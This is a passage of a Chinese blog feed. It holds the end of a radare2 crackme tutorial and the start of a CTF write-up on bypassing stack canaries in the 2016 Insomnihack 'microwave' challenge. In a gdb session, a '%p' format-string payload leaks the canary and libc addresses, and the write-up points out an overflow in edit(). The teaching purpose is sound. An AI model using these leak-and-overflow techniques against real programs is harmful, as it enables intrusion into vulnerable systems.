str._n__.::_Megabeets_::.0x08048715 23 str.Think_you_can_make_it_0x0804872c 10 str.Success__n0x08048736 22 str.Nop__Wrong_argument._n</code></pre><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>我们看到<code>r2</code>列出了一些字符串的偏移，还有一些变量名。让我们主要来看看字符串。有很多可以列出程序中字符串的方式，你可以选择你最需要的一种。<br><code>iz</code> – 列出在数据短的字符串<br><code>izz</code> – 在整个程序中查找字符串</p><pre><code class="shell">[0x08048370]&gt; izvaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\n .:: Megabeets ::.vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\nvaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\n</code></pre><p>我们已经熟悉了大部分字符串——还记得我们一开始运行程序时的那几行字符串吧。但是我们没有看到<code>Success</code>，这应该是我们输入正确字符串后的提示。既然我们已经得到了字符串，让我们看看它们在程序的什么地方被使用了。</p><pre><code class="shell">[0x08048370]&gt; axt @@ str.*data 0x8048609 push str._n__.::_Megabeets_::. in maindata 0x8048619 push str.Think_you_can_make_it_ in maindata 0x8048646 push str._n_tSuccess__n in maindata 0x8048658 push str._n_tNop__Wrong_argument._n in main</code></pre><p>这个命令展示给我们<code>radare2</code>更多的特点。<code>axt</code>命令用来在数据段或程序段交叉查找某个地址（试试<code>ax?</code>）。<code>@@</code>是一个迭代器标志，用来在一段偏移上重复某个命令（试试<code>@@?</code>）。<code>str.*</code>是一个对所有开头为<code>str.</code>的标志的通配。这条命令能帮助我列出字符串标志以及对应所在的函数名。在这之前要确保选择了字符串的标志空间（默认时是<code>fs *</code>）。</p><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><p>正如我之前所说的，之前我们一直在程序的入口点，现在应该去其他地方看看了。我们刚列出来的字符串都是在<code>main</code>函数中的。为了定位到字符串，我们需要使用<code>seek</code>命令，用<code>s</code>替代。正如大家所知道的，在（几乎）每个命令后加上<code>?</code>会解决你所有的问题。</p><pre><code class="shell">[0x08048370]&gt; s?|Usage: s  # Seek commands| s                 Print current address| s addr            Seek to address| s-                Undo seek| s- n              Seek n bytes backward| s–                Seek blocksize bytes backward| s+                Redo seek| s+ n              Seek n bytes forward| s++               Seek blocksize bytes forward| s[j*=]            List undo seek history (JSON, =list, *r2)| s/ DATA           Search for next occurrence of ‘DATA’| s/x 9091          Search for next occurrence of \x90\x91| s.hexoff          Seek honoring a base from core-&gt;offset| sa [[+-]a] [asz]  Seek asz (or bsize) aligned to addr| sb                Seek aligned to bb start| sC[?] string      Seek to comment matching given string| sf                Seek to next function (f-&gt;addr+f-&gt;size)| sf function       Seek to address of specified function| sg/sG             Seek begin (sg) or end (sG) of section or file| sl[?] [+-]line    Seek to line| sn/sp             Seek next/prev scr.nkey| so [N]            Seek to N next opcode(s)| sr pc             Seek to register</code></pre><p><code>seek</code>命令是接收一个地址或是一个数学表达式作为参数。这个表达式可以是数学运算、标志或者内存访问操作。我们可以执行<code>s main</code>来定位到 main 函数。让我们先通过<code>afl</code>命令（Analyze Functions List）来查看<code>radare2</code>为我们列出了哪些函数。</p><pre><code class="shell">[0x08048370]&gt; afl0x080482ec    3 35           sym._init0x08048320    1 6            sym.imp.strcmp0x08048330    1 6            sym.imp.strcpy0x08048340    1 6            sym.imp.puts0x08048350    1 6            sym.imp.__libc_start_main0x08048360    1 6            sub.__gmon_start___252_3600x08048370    1 33           entry00x080483a0    1 4            sym.__x86.get_pc_thunk.bx0x080483b0    4 43           sym.deregister_tm_clones0x080483e0    4 53           sym.register_tm_clones0x08048420    3 30           sym.__do_global_dtors_aux0x08048440    4 43   -&gt; 40   sym.frame_dummy0x0804846b   19 282          sym.rot130x08048585    1 112          sym.beet0x080485f5    5 127          main0x08048680    4 93           sym.__libc_csu_init0x080486e0    1 2            sym.__libc_csu_fini0x080486e4    1 20           sym._fini</code></pre><p>这些导入函数正是我们之前所看到的，包括入口点、libc、main 函数和两个引人注意的函数分别叫做<code>sym.beet</code>和<code>sym.rot13</code>。</p><h1 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h2><p>是时候去看看汇编代码了。首先我们用<code>s main</code>来定位到 main 函数，然后用<code>pdf</code>命令（Print Disassemble Function）来反汇编。注意地址是怎么准确地变成 main 函数的地址的。</p><blockquote><ul><li>注意：正如我之前所说的，这篇文章的目的是教大家学习和了解<code>radare2</code>，而不是教汇编语言的。因此我不会彻底地解释代码。实际上，这个程序也很简单，你只要有一点点基础的逆向工程知识就能掌握。</li></ul></blockquote><pre><code class="shell">[0x08048370]&gt; s main[0x080485f5]&gt; pdf          ;– main:/ (fcn) main 127|   main ();|           ; var int local_8h @ ebp-0x8|           ; var int local_4h @ esp+0x4|              ; DATA XREF from 0x08048387 (entry0)|           0x080485f5      8d4c2404       lea ecx, [esp + local_4h]   ; 0x4|           0x080485f9      83e4f0         and esp, 0xfffffff0|           0x080485fc      ff71fc         push dword [ecx – 4]|           0x080485ff      55             push ebp|           0x08048600      89e5           mov ebp, esp|           0x08048602      53             push ebx|           0x08048603      51             push ecx|           0x08048604      89cb           mov ebx, ecx|           0x08048606      83ec0c         sub esp, 0xc|           0x08048609      6800870408     push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.|           0x0804860e      e82dfdffff     call sym.imp.puts          ; int puts(const char *s)|           0x08048613      83c410         add esp, 0x10|           0x08048616      83ec0c         sub esp, 0xc|           0x08048619      6815870408     push str.Think_you_can_make_it_ ; “Think you can make it?” @ 0x8048715|           0x0804861e      e81dfdffff     call sym.imp.puts          ; int puts(const char *s)|           0x08048623      83c410         add esp, 0x10|           0x08048626      833b01         cmp dword [ebx], 1          ; [0x1:4]=0x1464c45|       ,=&lt; 0x08048629      7e2a           jle 0x8048655|       |   0x0804862b      8b4304         mov eax, dword [ebx + 4]    ; [0x4:4]=0x10101|       |   0x0804862e      83c004         add eax, 4|       |   0x08048631      8b00           mov eax, dword [eax]|       |   0x08048633      83ec0c         sub esp, 0xc|       |   0x08048636      50             push eax|       |   0x08048637      e849ffffff     call sym.beet|       |   0x0804863c      83c410         add esp, 0x10|       |   0x0804863f      85c0           test eax, eax|      ,==&lt; 0x08048641      7412           je 0x8048655|      ||   0x08048643      83ec0c         sub esp, 0xc|      ||   0x08048646      682c870408     push str.Success__n ; “Success!.” @ 0x804872c|      ||   0x0804864b      e8f0fcffff     call sym.imp.puts          ; int puts(const char *s)|      ||   0x08048650      83c410         add esp, 0x10|     ,===&lt; 0x08048653      eb10           jmp 0x8048665|     |||      ; JMP XREF from 0x08048629 (main)|     |||      ; JMP XREF from 0x08048641 (main)|     |-&gt; 0x08048655      83ec0c         sub esp, 0xc|     |     0x08048658      6836870408     push str.Nop__Wrong_argument._n ; “Nop, Wrong argument..” @ 0x8048736|     |     0x0804865d      e8defcffff     call sym.imp.puts          ; int puts(const char *s)|     |     0x08048662      83c410         add esp, 0x10|     |        ; JMP XREF from 0x08048653 (main)|     `—&gt; 0x08048665      b800000000     mov eax, 0|           0x0804866a      8d65f8         lea esp, [ebp – local_8h]|           0x0804866d      59             pop ecx|           0x0804866e      5b             pop ebx|           0x0804866f      5d             pop ebp|           0x08048670      8d61fc         lea esp, [ecx – 4]\           0x08048673      c3             ret</code></pre><p>看过汇编代码后，我们可以写出一段简单的伪代码：</p><pre><code class="cpp">if (argc &gt; 1 &amp;&amp; beet(argv[1]) == true)# i.e - if any argument passed to the program AND the result of beet, given the passed argument, is true# argc is the number of arguments passed to the program# argc will be at least 1 becuase the first argument is the program name# argv is the array of parameters passed to the program{    print &quot;success&quot;}else{     print &quot;fail&quot;}exit</code></pre><h2 id="可视化模式和图形模式"><a href="#可视化模式和图形模式" class="headerlink" title="可视化模式和图形模式"></a>可视化模式和图形模式</h2><p><code>radare2</code>有着一个非常强大、效率极高的可视化模式。可视化模式对用户非常友好并且将使用<code>r2</code>的逆向过程带到了一个新的高度。按下<code>V</code>键开启可视化模式。按下<code>p</code>/<code>P</code>键用来切换模式。在屏幕的最上方可以看到你输入的命令。这里按<code>p</code>可以切换回原来的反汇编模式。</p><p><img src="https://www.megabeets.net/uploads/visualMode_1.png" srcset="/img/loading.gif" alt></p><h3 id="可视化模式基本命令"><a href="#可视化模式基本命令" class="headerlink" title="可视化模式基本命令"></a>可视化模式基本命令</h3><h4 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h4><p>你可以通过<code>k</code>向上移动，通过<code>j</code>向下移动。回车键可以<code>jmp</code>或者<code>call</code>到目标地址。同时在每个<code>jmp</code>或<code>call</code>右侧注释的方括号中有数字，直接按相应的数字可跳转到对应地址。</p><h4 id="帮助"><a href="#帮助" class="headerlink" title="帮助"></a>帮助</h4><p>正如之前命令行下的<code>radare2</code>，按下<code>?</code>可以为你展现帮助窗口，你可以学习可视化模式下的各个命令。</p><h4 id="交叉引用"><a href="#交叉引用" class="headerlink" title="交叉引用"></a>交叉引用</h4><p>用<code>x</code>/<code>X</code>分别来列出当前函数的引用和调用的情况。按下对应数字来跳转。</p><h4 id="radare2命令"><a href="#radare2命令" class="headerlink" title="radare2命令"></a><code>radare2</code>命令</h4><p>使用：在可视化模式下输入<code>:command</code>来执行<code>r2</code>命令</p><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>你可以通过<code>;[-]comment</code>来添加或删去注释。</p><h4 id="标记"><a href="#标记" class="headerlink" title="标记"></a>标记</h4><p><code>m&lt;key&gt;</code>可以用来标记特定的偏移地址。<code>&#39;&lt;key&gt;</code>来跳到指定地址。</p><h4 id="退出"><a href="#退出" class="headerlink" title="退出"></a>退出</h4><p>按下<code>q</code>键返回到<code>r2</code>的 shell。</p><h3 id="可视化图形模式"><a href="#可视化图形模式" class="headerlink" title="可视化图形模式"></a>可视化图形模式</h3><p>和其他的一些反汇编器一样，<code>radare2</code>也有图形视图。你可以输入<code>VV</code>从 shell 进入图形视图，通过<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>向上/下/左/右移动，按<code>g</code>键跳转到目标函数（例如<code>gd</code>）。</p><p><img src="https://www.megabeets.net/uploads/visualGraph_1.png" srcset="/img/loading.gif" alt></p><p>按<code>?</code>来列出所有的命令，其中<code>R</code>命令值得一学。</p><h2 id="反汇编beet函数"><a href="#反汇编beet函数" class="headerlink" title="反汇编beet函数"></a>反汇编<code>beet</code>函数</h2><p>接下来回到反汇编函数上，看看<code>beet</code>函数。正如我们之前所看到的，我们的程序检查了<code>beet</code>的返回结果，也就是我们输入的参数。我们可以通过一些方式输出<code>beet</code>的返回值，这里列出几种：</p><ol><li>在<code>r2</code>的 shell 中定位到<code>beet</code>函数，然后通过<code>s sym.beet</code>（<code>sym.beet</code>是<code>beet</code>函数的一个标志。你可以通过<code>f sym.&lt;tab&gt;</code>输出出<code>sym</code>的标志）输出函数，然后执行<code>pdf</code>（Print Disassemble Function）；</li><li>在<code>r2</code>的 shell 下，通过<code>pdf @ sym.beet</code>输出<code>beet</code>函数。<code>@</code>是临时的定位（输出<code>sym.beet</code>地址处的函数）；</li><li>可视化模式下在 main 函数下跳到<code>beet</code>函数；</li><li>可视化图形界面下在 main 函数中使用<code>gd</code>（<code>d</code>是<code>call</code>边上的字母）</li></ol><p>这是<code>beet</code>函数在图形视图下的样子：</p><p><img src="https://www.megabeets.net/uploads/visualGraph_beet1.png" srcset="/img/loading.gif" alt></p><p>我们可以看到输入的参数被复制给了一个缓冲空间。缓存区的位置在<code>ebp - local_88h</code>。<code>local_88h</code>其实是 0x88，也就是十进制的 136。在可视化模式下，我们可以用<code>:</code>执行<code>r2</code>的命令<code>? 0x88</code>查看。</p><pre><code class="shell">:&gt; ? 0x88136 0x88 0210 136 0000:0088 136 “\x88” 10001000 136.0 136.000000f 136.000000</code></pre><p>由于 4 个字节保存了前一个栈帧的 ebp 值，接下来的 4 个字节则是返回地址，因此在栈上的缓冲区大小为 128 个字节，总共为 136 个字节。</p><p>在缓冲区之后是我们输入的参数，它和函数<code>sym.rot13</code>的结果进行比较。<a href="https://en.wikipedia.org/wiki/ROT13" target="_blank" rel="noopener">Rot-13</a>是一个著名的置换加密，经常在 CTF 以及 Crackme 中使用。这个函数接收了 9 个十六进制数，看起来<code>radare2</code>没有把它们识别成一个字符串。我们可以在其地址上执行<code>ahi s</code>。</p><pre><code class="shell">:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7</code></pre><p><code>ahi s</code>用来将将具体地址转换成字符串（试试<code>ahi?</code>）。<code>@@</code>是一个迭代器（试试<code>@@</code>），然后这些地址则是<code>sym.beet</code>函数中没被<code>radare2</code>识别成字符串的部分。执行完这条命令后，图形视图会自动刷新（如果没有自动刷新，执行<code>r</code>）成这样：</p><p><img src="https://www.megabeets.net/uploads/visualGraph_beet2.png" srcset="/img/loading.gif" alt></p><p>看起来没被识别出来的字符串是<code>Megabeets</code>（根据<a href="https://en.wikipedia.org/wiki/Endianness" target="_blank" rel="noopener">字节序</a>反向压栈得到）。</p><p>该程序通过<code>strcmp</code>将经过 rot13 处理后的<code>Megabeets</code>与我们输入的参数进行比较。幸运的是我们不需要辛苦地分析 rot13 的具体算法，因为<code>r2</code>框架中的<code>rahash2</code>工具已经包含了 rot13 加密。</p><p><code>rahash2</code>通过不同的算法计算文件或是字符串的校验值。</p><p>使用<code>man rahash2</code>查看更多的用法。</p><pre><code class="shell">:&gt; !rahash2 -E rot -S s:13 -s ‘Megabeets\n’Zrtnorrgf</code></pre><p><code>rahash2</code>执行了<code>rot13(“Megabeets”)</code>后得到了字符串<code>Zrtnorrgf</code>。输入<code>!</code>可以在<code>r2</code>的 shell 下执行系统命令。我们假设<code>Zrtnorrgf</code>就是要和我们的输入进行比较的字符串。让我们在调试模式下打开程序，使用<code>ood</code>（试试<code>ood?</code>）并将<code>Zrtnorrgf</code>作为参数，看看我们会得到什么。</p><pre><code class="shell">[0xf7749be9]&gt; ood?| ood [args]    reopen in debugger mode (with args)[0xf7749be9]&gt; ood ZrtnorrgfWait event received by different pid 7415Wait event received by different pid 7444Process with PID 7575 started…File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode= attach 7575 7575Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1[0xf7749be9]&gt; dcSelecting and continuing: 7575.:: Megabeets ::.Think you can make it?Success!PTRACE_EVENT_EXIT pid=7575, status=0x0</code></pre><p>我们收到了成功的提示，破解了这个 Crackme。在成功破解之后，我们终于可以说这个程序就是将我们输入的第一个参数与<code>rot13(“Megabeets”)</code>进行了比较，也就是<code>Zrtnorrgf</code>。</p><p>你可以在<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%201%20-%20Simple%20crackme/megabeets_0x1.c" target="_blank" rel="noopener">这里</a>查看 Crackme 的完整源码。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><code>Radare2</code>之旅第一部分就告一段落了。我们只接触了<code>radare2</code>的表皮，仅仅了解了它最最基础的一些功能。在下一部分中，我们将会学习更多的关于<code>radare2</code>的功能，包括脚本处理、恶意软件分析和漏洞利用。我知道对于很多人来说一开始是很难的，不管是能否感受到<code>radare2</code>的强大之处，亦或是将你的以前的习惯放到一边而熟悉使用<code>radare2</code>。不管你是一个逆向工程师、一个 CTF 比赛选手或者只是一个安全爱好者，我敢保证将<code>radare2</code>收入你的工具箱绝对一个是明智的选择。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>translation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过ELF的安全防护机制Canary</title>
    <link href="/2019/02/15/%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/"/>
    <url>/2019/02/15/%E7%BB%95%E8%BF%87ELF%E7%9A%84%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6Canary/</url>
    
    <content type="html"><![CDATA[<p>入门 canary。</p><a id="more"></a><h1 id="何为-Canary"><a href="#何为-Canary" class="headerlink" title="何为 Canary"></a>何为 Canary</h1><p>由于 <code>stack overflow</code> 而引发的攻击非常普遍也非常古老，相应地一种叫做 <code>Canary</code> 的技术很早就出现在 <code>glibc</code> 里，直到现在也作为系统安全的第一道防线存在。<code>Canary</code> 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的 canary 值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。<code>Canary</code> 不管是实现还是设计思想都比较简单高效，就是插入一个值，在 <code>stack overflow</code> 发生的高危区域的尾部，当函数返回之时检测 <code>Canary</code> 的值是否经过了改变，以此来判断 <code>stack/buffer overflow</code> 是否发生。<code>Canary</code> 与 Windows 下的 <code>GS保护</code> 都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 <code>linux</code> 下保护机制的标配。</p><p>以 32 位程序为例。没开 Canary 时的栈：</p><pre><code>+------------------+|    parameter     |+------------------+|    local var1    |+------------------+|    local var2    |+------------------+|       ebp        |+------------------+|    return addr   |+------------------+</code></pre><p>开启 Canary 后的栈：</p><pre><code>+------------------+|    parameter     |+------------------+|    local var1    |+------------------+|    local var2    |+------------------+|      canary      | &lt;- Random+------------------+|       ebp        |+------------------+|    return addr   |+------------------+</code></pre><p>在 <code>EBP</code> 之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测 <code>Canary</code> 是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖 <code>Canary</code>，这时程序会直接退出。只有泄漏了<code>Canary</code>，才能 overflow 后面的 return address：</p><pre><code class="gdb">   0x804852b &lt;func+71&gt;:    mov    eax,DWORD PTR [ebp-0xc]   0x804852e &lt;func+74&gt;:    xor    eax,DWORD PTR gs:0x14=&gt; 0x8048535 &lt;func+81&gt;:    je     0x804853c &lt;func+88&gt; | 0x8048537 &lt;func+83&gt;:    call   0x8048390 &lt;__stack_chk_fail@plt&gt; | 0x804853c &lt;func+88&gt;:    leave | 0x804853d &lt;func+89&gt;:    ret | 0x804853e &lt;main&gt;:    lea    ecx,[esp+0x4] |-&gt;   0x804853c &lt;func+88&gt;:    leave       0x804853d &lt;func+89&gt;:    ret</code></pre><p>如果没有绕过 <code>Canary</code>，就会 <code>call</code> 到 glibc 中的函数 <code>__stack_chk_fail</code>：</p><pre><code class="cpp">void __attribute__ ((noreturn)) __stack_chk_fail (void){  __fortify_fail (&quot;stack smashing detected&quot;);}void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg){  /* The loop is added only to keep gcc happy.  */  while (1)    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);}</code></pre><h1 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a><code>Canary</code> 绕过技术</h1><h2 id="泄漏-Canary"><a href="#泄漏-Canary" class="headerlink" title="泄漏 Canary"></a>泄漏 <code>Canary</code></h2><p><code>Canary</code> 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 <code>Canary</code> 可以截断字符串。泄露栈中的 <code>Canary</code> 的思路是覆盖 <code>Canary</code> 的低字节，来打印出剩余的 <code>Canary</code> 部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 <code>Canary</code>，之后再次溢出控制执行流程。如果存在 <code>format string</code> 那么还可以泄漏 <code>Canary</code>。</p><h3 id="2016-insomnihack-microwave"><a href="#2016-insomnihack-microwave" class="headerlink" title="2016-insomnihack-microwave"></a>2016-insomnihack-microwave</h3><p><code>checksec</code> 一下程序，64 位 elf，保护全开：</p><pre><code class="shell">[*] &#39;/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled</code></pre><p>拖进 ida 查看一下程序。程序大概意思是连接推特账户，编辑内容，发布最喜爱食物：</p><pre><code class="cpp">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3){  char *v3; // r12  char input; // [rsp+0h] [rbp-38h]  unsigned __int64 v5; // [rsp+8h] [rbp-30h]  v5 = __readfsqword(0x28u);  setbuf(stdout, 0LL);  v3 = (char *)malloc(0x3EuLL);  puts(&quot;\n --------------------------------------------------------&quot;);  puts(&quot; |     Welcome to the next generation of MicroWaves!    |&quot;);  puts(&quot; |                         ***                          |&quot;);  puts(&quot; | This stylish Microwave with Grill function, includes |&quot;);  puts(&quot; |      a function that tweets your favourite food!     |&quot;);  puts(&quot; |                         ***                          |&quot;);  puts(&quot; --------------------------------------------------------&quot;);  fflush(0LL);  while ( 1 )  {    while ( 1 )    {      choice();      fwrite(&quot;\n           [MicroWave]: &quot;, 1uLL, 0x19uLL, stdout);      fgets(&amp;input, 3, stdin);      if ( input != &#39;2&#39; )        break;      if ( *((_WORD *)v3 + 30) == 1 )        edit();      else        fwrite(&quot;\n      First: please connect to your Twitter account!\n\n&quot;, 1uLL, 0x37uLL, stdout);    }    if ( input &lt;= &#39;2&#39; )    {      if ( input == &#39;1&#39; )                       // choice 1      {        fwrite(&quot;\n           Log in on Twitter:\n&quot;, 1uLL, 0x1FuLL, stdout);        fwrite(&quot;           username: &quot;, 1uLL, 0x15uLL, stdout);        fflush(0LL);        fgets(v3, 40, stdin);        fwrite(&quot;           password: &quot;, 1uLL, 0x15uLL, stdout);        fflush(0LL);        fgets(v3 + 40, 20, stdin);        connect(v3);      }    }    else if ( input == &#39;3&#39; )                    // choice 3    {      if ( *((_WORD *)v3 + 30) == 1 )        tweet();      else        fwrite(&quot;\n      Hey Dude! This didn&#39;t work out!\n\n&quot;, 1uLL, 0x28uLL, stdout);    }    else if ( input == &#39;q&#39; )                    // quit    {      fwrite(&quot;\n           Bye!\n\n&quot;, 1uLL, 0x12uLL, stdout);      exit(0);    }  }}</code></pre><p>在 <code>connect()</code> 函数中，发现了一个需要过的 check 密码，同时还有用户名的输入存在 <code>format string</code>，故这里可以泄漏出栈上的 <code>Canary</code>：</p><pre><code class="cpp">unsigned __int64 __fastcall connect(char *input){  size_t j; // rbx  char *string; // rbx  size_t v3; // rax  __int64 i; // rdx  unsigned __int64 v6; // [rsp+8h] [rbp-20h]  j = 1LL;  v6 = __readfsqword(0x28u);  __printf_chk(1LL, (__int64)&quot;\nChecking &quot;);  __printf_chk(1LL, (__int64)input);  puts(&quot;Twitter account&quot;);  fflush(0LL);  while ( j &lt; strlen(input + 40) )  {    ++j;    putchar(&#39;.&#39;);    fflush(0LL);    usleep(0x186A0u);  }  putchar(&#39;\n&#39;);  string = password;  v3 = strlen(password);  for ( i = 0LL; ; ++i )  {    if ( i == v3 )    {      *((_WORD *)input + 30) = 1;      return __readfsqword(0x28u) ^ v6;    }    if ( input[i + 40] != string[i] )      break;  }  *((_WORD *)input + 30) = 0;  return __readfsqword(0x28u) ^ v6;}</code></pre><p>在 <code>edit()</code> 函数中存在 <code>buffer overflow</code>，读了很长一串字符：</p><pre><code class="cpp">unsigned __int64 edit(){  __int64 v1; // [rsp+0h] [rbp-418h]  unsigned __int64 v2; // [rsp+408h] [rbp-10h]  v2 = __readfsqword(0x28u);  __printf_chk(1LL, (__int64)&quot;\n           #&gt; &quot;);  fflush(0LL);  read(0, &amp;v1, 0x800uLL);  puts(&quot;\n           Done.&quot;);  return __readfsqword(0x28u) ^ v2;}</code></pre><p>同时通过调试可以找到栈上的某个值与 libc 的偏移，以用来计算 base：</p><pre><code class="gdb">assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwaveGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from ./microwave...(no debugging symbols found)...done.assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6assassinq&gt;&gt; rStarting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave -------------------------------------------------------- |     Welcome to the next generation of MicroWaves!    | |                         ***                          | | This stylish Microwave with Grill function, includes | |      a function that tweets your favourite food!     | |                         ***                          | --------------------------------------------------------           ----------------------------------           |  1. Connect to Twitter account |           |  2. Edit your tweet            |           |  3. Grill &amp; Tweet your food    |           |  q. Exit                       |           ----------------------------------           [MicroWave]: 1           Log in on Twitter:           username: %p.%p.%p.%p.%p.%p.%p.%p           password: n07_7h3_fl46Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710Twitter account............           ----------------------------------           |  1. Connect to Twitter account |           |  2. Edit your tweet            |           |  3. Grill &amp; Tweet your food    |           |  q. Exit                       |           ----------------------------------           [MicroWave]: ^CProgram received signal SIGINT, Interrupt.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)RDX: 0x400RSI: 0x555555759060 (&quot;n07_7h3_fl46\np.%p.%p.%p\n&quot;)RDI: 0x0RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:    cmp    rax,0x0)RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001)R8 : 0x7ffff7dd3780 --&gt; 0x0R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)R11: 0x246R12: 0xa (&#39;\n&#39;)R13: 0x2R14: 0x55555575906d (&quot;p.%p.%p.%p\n&quot;)R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------]   0x7ffff7b04257 &lt;read+7&gt;:    jne    0x7ffff7b04269 &lt;read+25&gt;   0x7ffff7b04259 &lt;__read_nocancel&gt;:    mov    eax,0x0   0x7ffff7b0425e &lt;__read_nocancel+5&gt;:    syscall=&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;:    cmp    rax,0xfffffffffffff001   0x7ffff7b04266 &lt;__read_nocancel+13&gt;:    jae    0x7ffff7b04299 &lt;read+73&gt;   0x7ffff7b04268 &lt;__read_nocancel+15&gt;:    ret   0x7ffff7b04269 &lt;read+25&gt;:    sub    rsp,0x8   0x7ffff7b0426d &lt;read+29&gt;:    call   0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;[------------------------------------stack-------------------------------------]0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;:    cmp    rax,0x0)0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad22880024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a310032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;:    cmp    eax,0xffffffff)0040| 0x7fffffffda50 --&gt; 0x00048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;:    cmp    eax,0xffffffff)0056| 0x7fffffffda60 --&gt; 0x19[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGINT0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484    ../sysdeps/unix/syscall-template.S: No such file or directory.assassinq&gt;&gt; vmmapStart              End                Perm    Name0x0000555555554000 0x0000555555557000 r-xp    /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555757000 0x0000555555758000 r--p    /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555758000 0x0000555555759000 rw-p    /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555759000 0x000055555577a000 rw-p    [heap]0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp    /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p    